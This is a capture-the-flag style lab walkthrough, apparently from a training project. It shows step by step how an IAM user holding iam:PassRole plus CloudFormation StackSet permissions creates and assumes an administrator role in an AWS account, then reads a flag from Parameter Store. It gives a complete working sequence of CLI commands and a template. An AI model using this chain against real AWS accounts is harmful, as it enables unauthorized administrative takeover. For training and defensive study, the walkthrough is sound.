# Guided Walkthrough: Privilege Escalation via iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with both `iam:PassRole` and `cloudformation:CreateStackSet` permissions can escalate privileges by passing an administrative execution role to CloudFormation StackSets. CloudFormation StackSets are designed to deploy stacks across multiple AWS accounts and regions, but they can also be used within a single account to create resources with elevated permissions.

The attack exploits the StackSet execution model, which requires two roles: an administration role (used by the AWS service) and an execution role (used to perform the actual resource creation). When a user can pass a privileged execution role to a StackSet and deploy CloudFormation templates, they can create IAM resources such as roles, users, or policies with any permissions defined in the template. The attacker then assumes the newly created escalated role to gain administrative access.

This privilege escalation path is particularly dangerous because it leverages a legitimate AWS service (CloudFormation StackSets) to create privileged resources indirectly. Many organizations grant `cloudformation:CreateStackSet` permissions without fully understanding the privilege escalation implications when combined with `iam:PassRole` on administrative execution roles. The attack is stealthy, as the resource creation appears to be a normal infrastructure deployment operation, and it provides persistence through the newly created IAM role.

## The Challenge

You start as `pl-prod-cloudformation-003-to-admin-starting-user` — an IAM user with credentials provided via Terraform outputs. Your goal is to gain administrative access to the AWS account by reaching `pl-prod-cloudformation-003-to-admin-escalated-role`.

The starting user has three key permissions: `iam:PassRole` scoped to `pl-prod-cloudformation-003-to-admin-execution-role`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances`. None of these permissions directly grants admin access — but together they form a complete privilege escalation chain through CloudFormation's StackSet mechanism.

## Reconnaissance

First, confirm your identity and scope out what roles you can pass:

```bash
aws sts get-caller-identity
```

Next, check what roles are available and look for the execution role:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `cloudformation-003`)]'
aws iam get-role --role-name pl-prod-cloudformation-003-to-admin-execution-role
```

Notice that `pl-prod-cloudformation-003-to-admin-execution-role` has `AdministratorAccess` attached. This is the role you will pass to CloudFormation — which means anything CloudFormation does using that role will run with full admin permissions. That is the key insight.

## Exploitation

### Step 1: Craft the CloudFormation template

You need a CloudFormation template that defines an IAM role with `AdministratorAccess` and a trust policy allowing your starting user to assume it. Create this locally:

```bash
cat > /tmp/escalation-template.json << 'EOF'
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "EscalatedRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "pl-prod-cloudformation-003-to-admin-escalated-role",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-003-to-admin-starting-user"
            },
            "Action": "sts:AssumeRole"
          }]
        },
        "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    }
  }
}
EOF
```

Replace `ACCOUNT_ID` with your actual account ID (from the `get-caller-identity` output above).

### Step 2: Create the StackSet, passing the privileged execution role

```bash
aws cloudformation create-stack-set \
  --stack-set-name pl-cf003-escalation \
  --template-body file:///tmp/escalation-template.json \
  --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role \
  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/AWSCloudFormationStackSetAdministrationRole
```

The `--execution-role-name` argument is where `iam:PassRole` is exercised. CloudFormation will assume `pl-prod-cloudformation-003-to-admin-execution-role` when deploying the stack, giving it full admin permissions to create whatever the template defines.

### Step 3: Deploy a stack instance to trigger resource creation

```bash
aws cloudformation create-stack-instances \
  --stack-set-name pl-cf003-escalation \
  --accounts ACCOUNT_ID \
  --regions us-east-1 \
  --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
```

Note the `operationId` in the response — you will need it to check progress.

### Step 4: Wait for the operation to complete

```bash
aws cloudformation describe-stack-set-operation \
  --stack-set-name pl-cf003-escalation \
  --operation-id OPERATION_ID
```

Poll until `Status` transitions from `RUNNING` to `SUCCEEDED`. Once it does, the IAM role defined in the template has been created using the execution role's administrative permissions.

### Step 5: Assume the escalated role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-escalated-role \
  --role-session-name escalation-session
```

Export the returned credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

## Verification

Confirm you now have administrative access:

```bash
aws iam list-users
aws sts get-caller-identity
```

If `list-users` succeeds and `get-caller-identity` shows the escalated role ARN, you have full administrative access to the account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy on the escalated role provides implicitly.

Using your escalated role session credentials (set in the previous step), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/cloudformation-003-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a three-permission combination: `iam:PassRole` + `cloudformation:CreateStackSet` + `cloudformation:CreateStackInstances`. None of these individually grants admin access, but together they let you instruct CloudFormation to act as a privileged execution role and create any AWS resource — including an IAM role with `AdministratorAccess` that you then assumed.

This is a common pattern in real environments where infrastructure teams grant broad CloudFormation permissions to service accounts or developers without realizing that `iam:PassRole` on an admin-level execution role is effectively equivalent to having admin access. The CloudFormation StackSet path is particularly stealthy because the resource creation appears as routine infrastructure deployment in CloudTrail logs.
